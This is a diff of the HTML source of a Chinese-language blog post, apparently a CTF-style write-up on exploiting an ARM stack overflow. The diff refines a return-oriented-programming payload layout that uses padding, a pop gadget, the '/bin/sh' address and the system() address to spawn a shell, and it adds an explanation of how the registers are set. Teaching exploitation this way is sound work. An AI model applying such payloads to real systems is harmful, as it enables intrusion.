@@ -431,12 +431,13 @@ aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa
 <p>可以看到其执行命令的逻辑和地址：</p>
 <p><img src="https://i.loli.net/2018/10/15/5bc44d1ac5d50.png" alt=""></p>
 <p>接下来可以开始构造payload结构：</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">|</span>     padding        <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> 112*<span class="token string">'a'</span>
-<span class="token operator">|</span>     gadget_addr    <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span>0x20904<span class="token punctuation">)</span>
-<span class="token operator">|</span>        r0            <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span>0x6c384<span class="token punctuation">)</span>    /bin/sh_addr
-<span class="token operator">|</span>    junk_data        <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span><span class="token string">"anything"</span><span class="token punctuation">)</span>
-<span class="token operator">|</span>    system_addr        <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span>0x110b4<span class="token punctuation">)</span>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">|</span>    padding            <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> 112*<span class="token string">'a'</span>
+<span class="token operator">|</span>    pop <span class="token punctuation">{</span>r0,r4,pc<span class="token punctuation">}</span>    <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span>0x20904<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#gadget_addr</span>
+<span class="token operator">|</span>    /bin/sh            <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span>0x6c384<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#/bin/sh_addr</span>
+<span class="token operator">|</span>    junk_data<span class="token punctuation">(</span>r4<span class="token punctuation">)</span>    <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span><span class="token string">"anything"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#r4填充</span>
+<span class="token operator">|</span>    system_addr<span class="token punctuation">(</span>pc<span class="token punctuation">)</span>    <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span>0x110b4<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#system函数地址</span>
 </code></pre>
+<p><strong>溢出导致PC指向gadget_addr，然后执行命令pop出栈将”/bin/sh”赋值到r0寄存器，junk_data赋值到r4寄存器，system_addr赋值到PC寄存器。</strong></p>
 </blockquote>
 <h3 id="五-攻破"><a href="#五-攻破" class="headerlink" title="五.攻破"></a>五.攻破</h3><blockquote>
 <p>写出exp:    </p>
